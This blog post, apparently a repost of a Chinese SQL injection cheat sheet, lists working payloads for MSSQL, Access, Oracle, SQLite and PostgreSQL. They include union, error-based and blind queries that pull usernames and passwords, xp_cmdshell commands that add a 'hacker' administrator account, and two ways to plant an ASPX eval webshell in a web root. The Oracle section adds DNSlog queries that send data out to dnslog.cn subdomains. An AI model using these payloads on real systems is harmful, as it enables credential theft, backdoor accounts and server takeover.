<p>and 1&#x3D;convert(int,(select top 1 table_name from information_schema.tables where table_name not in(‘photoGalary’) )) 获取第二个表名</p>
<p>and 1&#x3D;convert(int,(select top 1 column_name from information_schema.columns where table_name&#x3D;’login’ ))— 获取第一个列名</p>
<p>and 1&#x3D;convert(int,(select top 1 username from login ))</p>
<p>and 1&#x3D;convert(int,(select top 1 password from login ))</p>
<h3 id="2-全爆语句"><a href="#2-全爆语句" class="headerlink" title="(2)全爆语句"></a><strong>(2)全爆语句</strong></h3><p>爆表，要求sqlserver版本2005以上</p>
<p>and 1&#x3D;(select quotename(name) from 数据库名..sysobjects where xtype&#x3D;’U’ FOR XML PATH(‘’))–<br>and 1&#x3D;(select ‘|’%2bname%2b’|’ from 数据库名..sysobjects where xtype&#x3D;’U’ FOR XML PATH(‘’))–</p>
<p>爆列</p>
<p>and 1&#x3D;(select quotename(name) from 数据库名..syscolumns where id &#x3D;(select id from 数据库名..sysobjects where name&#x3D;’指定表名’) FOR XML PATH(‘’))–<br>and 1&#x3D;(select ‘|’%2bname%2b’|’ from 数据库名..syscolumns where id &#x3D;(select id from 数据库名..sysobjects where name&#x3D;’指定表名’) FOR XML PATH(‘’))—</p>
<h3 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a><strong>时间注入</strong></h3><p>aspx?id&#x3D;1;if (select IS_SRVROLEMEMBER(‘sysadmin’))&#x3D;1 WAITFOR DELAY ‘0:0:5’ –</p>
<p>如果是sa权限，就延时。</p>
<p>案例：</p>
<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657766248_62cf8168dbaad26776ceb.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
<p>判断内容</p>
<p>aspx?id&#x3D;1;if (ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)))&gt;1 WAITFOR DELAY ‘0:0:5’–</p>
<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a><strong>布尔盲注</strong></h3><p>1.aspx?id&#x3D;1 and ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)) &gt;&#x3D; 109</p>
<h3 id="XP-CMDSHELL检测"><a href="#XP-CMDSHELL检测" class="headerlink" title="XP_CMDSHELL检测"></a><strong>XP_CMDSHELL检测</strong></h3><p>看下目标的xp_cmdshell存储过程是否还在,主要是想看它有没有被删掉,你也可以用这种方式来查询其它你想知道的任何存储过程，如果判断还在，页面显示正常，不在的话页面报错。</p>
<p>and 1&#x3D;(select count(*) from master..sysobjects where xtype &#x3D; ‘x’ and name &#x3D; ‘xp_cmdshell’) –</p>
<p>开启xpcmdshell一句话。前提 1、支持堆叠 2、扩展存储过程没被删除</p>
<p>EXEC sp_configure ‘show advanced options’, 1;RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’, 1;RECONFIGURE;</p>
<p>前提：sa权限探测是否存在1433端口。然后检测是否开启CMDSHELL</p>
<p>用XP_CMDSHELL添加用户hacker：</p>
<p>exec master..xp_cmdshell “whoami”</p>
<p>asp?id&#x3D;3;exec master.dbo.xp_cmdshell ‘net user hacker 123456 &#x2F;add’</p>
<p>XP_CMDSHELL把用户hacker加到ADMIN组：</p>
<p>asp?id&#x3D;3;exec master.dbo.xp_cmdshell ‘net localgroup administrators hacker &#x2F;add’</p>
<p>学习的文档：<a target="_blank" rel="noopener" href="https://www.lagou.com/lgeduarticle/38721.html">https://www.lagou.com/lgeduarticle/38721.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/vigarbuaa/p/3371500.html">https://www.cnblogs.com/vigarbuaa/p/3371500.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cnjava/archive/2012/06/13/2547524.html">https://www.cnblogs.com/cnjava/archive/2012/06/13/2547524.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_34319999/article/details/92479895">https://blog.csdn.net/weixin_34319999/article/details/92479895</a></p>
<h2 id="拿shell方法"><a href="#拿shell方法" class="headerlink" title="拿shell方法"></a><strong>拿shell方法</strong></h2><p>前提：</p>
<p>1具备sa或者dbo权限</p>
<p>2web目录的绝对路径 （可以利用xp_cmdshell的方式寻找绝对路径，插个眼）</p>
<h3 id="1-xp-cmdshell拿shell"><a href="#1-xp-cmdshell拿shell" class="headerlink" title="(1)xp_cmdshell拿shell"></a><strong>(1)xp_cmdshell拿shell</strong></h3><p>1.aspx?id&#x3D;1;exec master..xp_cmdshell ‘echo ^&lt;%@ Page Language&#x3D;”Jscript”%^&gt;^&lt;%eval(Request.Item[“pass”],”unsafe”);%^&gt; &gt; c:\WWW\aufeng.aspx’ ;</p>
<h3 id="2-差异备份拿shell"><a href="#2-差异备份拿shell" class="headerlink" title="(2)差异备份拿shell"></a><strong>(2)差异备份拿shell</strong></h3><p>大概思路：</p>
<p>假设：<a target="_blank" rel="noopener" href="http://xxxxx/show.aspx?code=1">http://xxxxx/show.aspx?code=1</a></p>
<p>中的code参数存在注入点 并且获得数据库名字为abc 爆出了物理路径为e:\xampp\htdocs\dvwa\</p>
<p>(1) 修改数据库设置为恢复模式</p>
<p><a target="_blank" rel="noopener" href="http://xxxxx/show.asp?code=1%27;alter">http://xxxxx/show.asp?code=1&#39;;alter</a> database abc set RECOVERY FULL –</p>
<p>完全恢复模式是默认的恢复模式。在完全恢复模式下，需要手工的对事务日志进行管理，优点是可以恢复到数据库失败或者指定的时间点上。</p>
<p>(2) 备份当前数据库日志到文件</p>
<p><a target="_blank" rel="noopener" href="http://xxxxx/show.aspx?code=1%27;backup">http://xxxxx/show.aspx?code=1&#39;;backup</a> log abc to disk&#x3D;‘e:\xampp\htdocs\dvwa’ with init –</p>
<p>备份数据库日志到服务器上，其中路径是网页的物理路径。</p>
<p>(3) 建立一张表和一个字段</p>
<p><a target="_blank" rel="noopener" href="http://xxxxx/show.aspx?code=1%27;create">http://xxxxx/show.aspx?code=1&#39;;create</a> table tt(a text) –</p>
<p>(4) 往表中插入一句话马子</p>
<p><a target="_blank" rel="noopener" href="http://xxxxx/show.asp?code=1%27;insert">http://xxxxx/show.asp?code=1&#39;;insert</a> into tt(a) values(’&lt;%eval request(“abc”) %&gt;’) –</p>
<p>values中的内容一般转换为马子的hex值。</p>
<p>(5) 再次备份日志</p>
<p><a target="_blank" rel="noopener" href="http://xxxxx/show.asp?code=1%27;backup">http://xxxxx/show.asp?code=1&#39;;backup</a> log ahykd_new to disk&#x3D;‘e:\xampp\htdocs\dvwa\1.aspx’ –</p>
<p>再次备份日志，备份路径为网站服务器的物理路径</p>
<p>(6) 删除表</p>
<p><a target="_blank" rel="noopener" href="http://xxxxx/show.aspx?code=1%27;drop">http://xxxxx/show.aspx?code=1&#39;;drop</a> table tt –</p>
<p>然后菜刀尝试连接<a target="_blank" rel="noopener" href="http://xxxxx/1.aspx">http://xxxxx/1.aspx</a></p>
<p>参考文章：这里是借鉴大佬的笔记的总结</p>
<p><a target="_blank" rel="noopener" href="https://www.yuque.com/aufeng/aufeng_good/iganif#Q5PqT">https://www.yuque.com/aufeng/aufeng_good/iganif#Q5PqT</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/vigarbuaa/p/3371500.html">https://www.cnblogs.com/vigarbuaa/p/3371500.html</a></p>
<p><strong>Access注入</strong></p>
<p>Access数据库没有记录所有表名和列名的表，也就意味着我们需要依靠字典进行猜解表名和列</p>
<p>Access数据库中没有注释符号.因此 &#x2F;**&#x2F; 、 – 和 # 都没法使用。</p>
<p>sqlmap语句：python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://test.com/1.asp?id=1">http://test.com/1.asp?id=1</a>“ –tables</p>
<h3 id="普通注入-2"><a href="#普通注入-2" class="headerlink" title="普通注入"></a><strong>普通注入</strong></h3><p>判断注入点</p>
<p>在参数后面加 单引号</p>
<p><a target="_blank" rel="noopener" href="http://www.example.com/new_list.asp?id=1">http://www.example.com/new_list.asp?id=1</a>‘ #页面报错</p>
<p><a target="_blank" rel="noopener" href="http://www.example.com/new_list.asp?id=1">http://www.example.com/new_list.asp?id=1</a> and 1&#x3D;1 #页面正常</p>
<p><a target="_blank" rel="noopener" href="http://www.example.com/new_list.asp?id=1">http://www.example.com/new_list.asp?id=1</a> and 1&#x3D;2 #页面报错</p>
<p>猜字段： 1 order by 4 报错 1 order by 3 正确</p>
<h3 id="有回显："><a href="#有回显：" class="headerlink" title="有回显："></a><strong>有回显：</strong></h3><p>?id&#x3D;-1 union select 1,2,3,4,5,6,7,8,9,10 from admin（此时页面有显示2、3）</p>
<p>查列：and exists (select 列名 from 表名) （假设存在user、password）</p>
<p>?id&#x3D;3 and exists (select * from test)</p>
<p>?id&#x3D;3 and exists (select * from admin)</p>
<p>?id&#x3D;3 and exists (select name from admin) 报错，说明不存在</p>
<p>?id&#x3D;3 and exists (select username from admin) 说明存在username</p>
<p>?id&#x3D;3 and exists (select password from admin) 说明存在password</p>
<p>?id&#x3D;-1 union select 1,2,3,4,5,6,7,8,9,10 找到注入位</p>
<p>?id&#x3D;-1 union select 1,user,password,4,5,6,7,8,9,10 from admin（即可爆出账号密码）</p>
<h3 id="无回显："><a href="#无回显：" class="headerlink" title="无回显："></a><strong>无回显：</strong></h3><p>查表：and exists (select * from 表名) 存在的话就返回正常 不存在就返回不正常</p>
<p>查列：and exists (select 列名 from 表名)</p>
<p>查内容：and (select top 1 asc(mid(user,1,1))from admin)&#x3D;97</p>
<p>and (select top 1 asc(mid(user,2,1))from admin)&#x3D;97 猜字段(username)中第一条记录内容的第二个字符</p>
<p>and (select top 2 asc(mid(user,1,1))from admin)&#x3D;97 猜字段(username)中第二条记录内容的第一个字符</p>
<h3 id="偏移注入（回显数连续）"><a href="#偏移注入（回显数连续）" class="headerlink" title="偏移注入（回显数连续）"></a><strong>偏移注入（回显数连续）</strong></h3><p>假设已经判断存在admin表，order by下判断有35行，且回显如下回显字段连续</p>
<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765814_62cf7fb6ed96ca3d6341d.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
<p>UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,* from admin –返回错误页面</p>
<p>UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,* from admin –返回错误页面</p>
<p>UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,* from admin –返回错误页面</p>
<p>UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,* from admin –返回到一个错误页面提示查询语句出错，因此admin表的列数为6</p>
<p>UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,admin.*,34,35 from admin</p>
<p>因为回显如下图 28 29 30是连着的，直接在27后加表名.*</p>
<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765836_62cf7fcc12b6e7da878c0.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
<p>爆出内容  
 </p>
<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765847_62cf7fd738ed7ab7c3339.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
<p>UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,admin.*,34,35 from admin where id &#x3D; 3 添加where id &#x3D;数值，可得到更多的内容</p>
<h3 id="偏移注入（常规操作）"><a href="#偏移注入（常规操作）" class="headerlink" title="偏移注入（常规操作）"></a><strong>偏移注入（常规操作）</strong></h3><p>Access偏移注入：表名知道，列名无法获取的情况下。</p>
<p>存在注入点，且order by下判断出字段数为22行</p>
<p><strong>爆出显位</strong></p>
<p>127.0.0.1&#x2F;asp&#x2F;index.asp?id&#x3D;1513 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin</p>
<p>*****<strong>号判断直到页面错误有变化</strong></p>
<p>127.0.0.1&#x2F;asp&#x2F;index.asp?id&#x3D;1513 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from admin 正确</p>
<p>说明admin有6个字段</p>
<p><strong>Access****偏移注入</strong>，基本公式为：</p>
<p>order by 出的字段数减去*号的字段数，然而再用order by的字段数减去2倍刚才得出来的答案；</p>
<p>也就是：</p>
<p>* &#x3D; 6个字符</p>
<p>2 × * &#x3D; 12个字符</p>
<p>22 - 12 &#x3D; 10个字符</p>
<p>一级偏移语句：</p>
<p>127.0.0.1&#x2F;asp&#x2F;index.asp?id&#x3D;1513 union select 1,2,3,4,5,6,7,8,9,10,* from (admin as a inner join admin as b on a.id &#x3D; b.id)</p>
<p>二级偏移语句：</p>
<p>127.0.0.1&#x2F;asp&#x2F;index.asp?id&#x3D;1513 union select 1,2,3,4,a.id,b.id,c.id,* from ((admin as a inner join admin as b on a.id &#x3D; b.id)inner join admin as c on a.id&#x3D;c.id)</p>
<p>实战常见的表和列（也可以用sqlmap的，但是量大且效率低）</p>
<p>常见的表有（最后根据企业名的缩写搭配上admin、user、name）</p>
<p>admin admins admin_user admin_usr admin_msg admin_login user username manager msg_user msg_login useradmin product、news、usr、system、article、customer、area</p>
<p>admin_id、admin_name、admin_password</p>
<p>常见的列</p>
<p>admin admin_user username password passwd pass pwd users usr user_login user_name login_name name等等</p>
<p>oracle注入(jsp)</p>
<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765866_62cf7fea9f4e6948d11dd.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
<h2 id="常规有回显注入"><a href="#常规有回显注入" class="headerlink" title="常规有回显注入"></a><strong>常规有回显注入</strong></h2><p>order by 3–</p>
<p>and 1&#x3D;2 union select null,null,null from dual–</p>
<p>and 1&#x3D;2 union select ‘null’,null,null from dual– &#x2F;&#x2F;返回正常，则第一个字段是数字型，返回错误，为字符型</p>
<p>and 1&#x3D;2 union select 1,’2’,’3’ from dual– &#x2F;&#x2F;判断显示位</p>
<p>and 1&#x3D;2 union select null,(select banner from sys.v_$version where rownum&#x3D;1),null from dual– &#x2F;&#x2F;探测数据库版本信息</p>
<p>and 1&#x3D;2 union select null,(select table_name from user_tables where rownum&#x3D;1),null from dual– &#x2F;&#x2F;查询第一个表名</p>
<p>and 1&#x3D;2 union select null,(select table_name from user_tables where rownum&#x3D;1 and table_name&lt;&gt;’STUDENT’),null from dual– &#x2F;&#x2F;第二个表名</p>
<p>获取关键表中的列名：</p>
<p>‘ union select null,(select column_name from user_tab_columns where table_name&#x3D;’T_USER’ and rownum&#x3D;1),null from dual –</p>
<p>‘ union select null,(select column_name from user_tab_columns where table_name&#x3D;’T_USER’ and column_name&lt;&gt;’SUSER’ and rownum&#x3D;1),null from dual –</p>
<p>‘ union select null,(select column_name from user_tab_columns where table_name&#x3D;’T_USER’ and column_name&lt;&gt;’SUSER’ and column_name&lt;&gt;’SPWD’ and rownum&#x3D;1),null from dual –</p>
<p>‘ union select null,(select column_name from user_tab_columns where table_name&#x3D;’T_USER’ and column_name&lt;&gt;’SUSER’ and column_name&lt;&gt;’SPWD’ and column_name&lt;&gt;’SNAME’ and rownum&#x3D;1),null from dual –</p>
<p>and 1&#x3D;2 union select SNAME,SUSER,SPWD from T_USER where id&#x3D;1– &#x2F;&#x2F;查看数据</p>
<h3 id="第二种常规注入"><a href="#第二种常规注入" class="headerlink" title="第二种常规注入"></a><strong>第二种常规注入</strong></h3><p>确定回显位，假设当前共2个字段，全是数字型，判断方式如下：<br>and 1&#x3D;2 union select 1,2 from dual　　假设回显位是2，爆当前数据库中的第一个表：<br>and 1&#x3D;2 union select 1,(select table_name from user_tables where rownum&#x3D;1) from dual　　爆当前数据库中的第二个表：<br>and 1&#x3D;2 union select 1,(select table_name from user_tables where rownum&#x3D;1 and table_name not in (‘第一个表’)) from dual　　以此类推去爆第n个表<br>爆某表中的第一个字段：<br>and 1&#x3D;2 union select 1,(select column_name from user_tab_columns where rownum&#x3D;1 and table_name&#x3D;’表名（大写的）’) from dual　　爆某表中的第二个字段：<br>and 1&#x3D;2 union select 1,(select column_name from user_tab_columns where rownum&#x3D;1 and table_name&#x3D;’表名’ and column_name not in (‘第一个字段’)) from dual　　爆其它字段以此类推<br>爆某表中的第一行数据：<br>and 1&#x3D;2 union select 1,字段1||字段2…||字段n from 表名 where rownum&#x3D;1 –连接多个字段用到的连接符号是||,在oracle数据库中，concat函数只能连接两个字符串</p>
<h3 id="报错注入-2"><a href="#报错注入-2" class="headerlink" title="报错注入"></a><strong>报错注入</strong></h3><p>利用 utl_inaddr.get_host_name<br>这种方法在Oracle 8g，9g，10g中不需要任何权限，但是在Oracle 11g以及以后的版本中，当前数据库用户必须有网络访问权限。</p>
<p>jsp?name&#x3D;’ and 1&#x3D;utl_inaddr.get_host_name((select user from dual)) –</p>
<p>ctxsys.drithsx.sn()</p>
<p>jsp?name&#x3D;’ and 1&#x3D;ctxsys.drithsx.sn(1,(select user from dual)) –</p>
<p>dbms_xdb_version.checkin()</p>
<p>jsp?name&#x3D;1’ and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null—</p>
<p>dbms_utility.sqlid_to_sqlhash()</p>
<p>jsp?name&#x3D;1’ and (SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual) is not null –</p>
<p>XMLType()</p>
<p>sname&#x3D;1′ and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null –</p>
<h3 id="布尔注入-1"><a href="#布尔注入-1" class="headerlink" title="布尔注入"></a><strong>布尔注入</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">jsp?id=1 and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,1,0) from dual) --<br></code></pre></td></tr></table></figure>

<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765888_62cf80001865e22a5f8e0.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
<p>username&#x3D;admin’ and (select substr(user, 1, 1) from dual)&#x3D;’S’ –</p>
<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a><strong>时间盲注</strong></h3><p>主要用DBMS_PIPE.RECEIVE_MESSAGE</p>
<p>即user的第一位是”A”时，延时5秒执行。</p>
<p>And 1&#x3D;(select decode(substr(user,1,1),’A’,DBMS_PIPE.RECEIVE_MESSAGE(‘a’,5) ,0) from dual)</p>
<p>第二位是D时，延时5秒</p>
<p>And 1&#x3D;(select decode(substr(user,2,1),’D’,DBMS_PIPE.RECEIVE_MESSAGE(‘a’,5) ,0) from dual)</p>
<p>news.jsp?id&#x3D;1 and 1&#x3D;(select decode(substr(user,1,1),’S’,dbms_pipe.receive_message(‘RDS’,5),0) from dual) –</p>
<h3 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a><strong>DNSlog注入</strong></h3><p>utl_inaddr.get_host_address</p>
<p>select utl_inaddr.get_host_address((select user from dual)||’.cbb1ya.dnslog.cn’) from dual</p>
<p>SYS.DBMS_LDAP.INIT 这个函数在 10g&#x2F;11g 中是 public 权限.</p>
<p>SELECT DBMS_LDAP.INIT((select user from dual)||’.24wypw.dnslog.cn’,80) FROM DUAL;</p>
<p>借鉴大佬博客：<a target="_blank" rel="noopener" href="https://www.yuque.com/aufeng/aufeng_good/iganif#zoa46">https://www.yuque.com/aufeng/aufeng_good/iganif#zoa46</a></p>
<h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a><strong>拓展</strong></h2><h2 id="Sqlite注入"><a href="#Sqlite注入" class="headerlink" title="Sqlite注入"></a><strong>Sqlite注入</strong></h2><p>如果您的站点允许用户通过网页输入，并将输入内容插入到 SQLite 数据库中，这个时候您就面临着一个被称为 SQL 注入的安全问题。本章节将向您讲解如何防止这种情况的发生，确保脚本和 SQLite 语句的安全。</p>
<p>1.Sqlite-master:这个是内置系统表、相当于mysql的information_schema</p>
<p>但是这里只存有表的信息，里面有个sql字段，有各个表的结构，有表名，字段名和类型</p>
<p>2.sqlite并不支持像mysql那样的注释，但是可以通过 — 方式增加DDL注释(写shell会用到)</p>
<p>可参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/hackzkaq/article/details/117119953">https://blog.csdn.net/hackzkaq/article/details/117119953</a></p>
<h2 id="Postsql注入"><a href="#Postsql注入" class="headerlink" title="Postsql注入"></a><strong>Postsql注入</strong></h2><p>PostgreSQL是一种特性非常齐全的自由软件的对象-关系型数据库管理系统（ORDBMS），4.2版本为基础的对象关系型数据库管理系统。</p>
<p>PostgreSQL安装后，默认的端口是：5432，默认的用户名是： postgres ，默认的数据库也是：postgres 。</p>
<ul>
<li><p>注释符：–</p>
</li>
<li><p>延时函数：pg_sleep(3)</p>
</li>
</ul>
<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765907_62cf8013ada166b4cf32d.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
<p>可参考谢公子的文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/104628797">https://blog.csdn.net/qq_36119192/article/details/104628797</a></p>
<h2 id="Oracle注入"><a href="#Oracle注入" class="headerlink" title="Oracle注入"></a><strong>Oracle注入</strong></h2><p><code>基础知识</code><br>Oracle 使用查询语句获取数据时需要跟上表名，没有表的情况下可以使用dual，dual是Oracle的虚拟表，用来构成select的语法规则，Oracle保证dual里面永远只有一条记录。</p>
<p>Oracle的数据类型是强匹配的(MYSQL有弱匹配的味道)，所以在Oracle进行类似UNION查询数据时候必须让对应位置上的数据类型和表中的列的数据类型是一致的，也可以使用null代替某些无法快速猜测出数据类型的位置。</p>
<p>参考文档学习：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42508548/article/details/121516504">https://blog.csdn.net/weixin_42508548/article/details/121516504</a></p>
<p>转自原文：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/339118.html#circle=on"><strong>浅谈Sql注入总结笔记整理(超详细)</strong></a></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E7%BD%91%E5%AE%89/" class="category-chain-item">网安</a>
  
  
    <span>></span>
    
  <a href="/categories/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/" class="category-chain-item">漏洞专题</a>
  
  

  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/sql%E6%B3%A8%E5%85%A5/" class="print-no-link">#sql注入</a>
      
    </div>
  
</div>


              

              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/08/07/%E7%BD%91%E5%AE%89/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/" title="一文讲清Docker逃逸">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">一文讲清Docker逃逸</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/" title="一文就学会网络钓鱼“骚”姿势">
                        <span class="hidden-mobile">一文就学会网络钓鱼“骚”姿势</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
